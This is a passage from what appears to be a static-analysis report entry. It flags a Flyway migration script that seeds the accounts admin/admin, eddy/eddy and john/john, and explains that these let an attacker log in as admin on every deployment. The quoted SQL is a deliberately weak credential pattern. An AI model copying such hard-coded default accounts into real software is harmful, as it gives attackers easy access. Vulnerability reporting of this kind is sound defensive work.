        {
          "ruleId": "password-management/hardcoded-password",
          "level": "error",
          "message": {
            "text": "The migration script hard-codes three user accounts with trivially guessable credentials where every password is identical to the username:\n\nVALUES\n  ('admin', 'admin'),   -- line 10\n  ('eddy',  'eddy'),    -- line 11\n  ('john',  'john');    -- line 12\n\nOf particular concern is the admin account, whose credential admin/admin is one of the most-attacked username/password combinations in the world. Because these accounts are created automatically by the Flyway migration, they exist in every deployment of the application unless explicitly removed — including production deployments. An unauthenticated attacker can log in immediately and gain full forum access (including message posting under the admin identity) with no effort.",
            "markdown": "The migration script hard-codes three user accounts with trivially guessable credentials where every password is identical to the username:\n\n```sql\nVALUES\n  ('admin', 'admin'),   -- line 10\n  ('eddy',  'eddy'),    -- line 11\n  ('john',  'john');    -- line 12\n```\n\nOf particular concern is the **admin** account, whose credential `admin/admin` is one of the most-attacked username/password combinations in the world. Because these accounts are created automatically by the Flyway migration, they exist in every deployment of the application unless explicitly removed — including production deployments. An unauthenticated attacker can log in immediately and gain full forum access (including message posting under the `admin` identity) with no effort."
          },
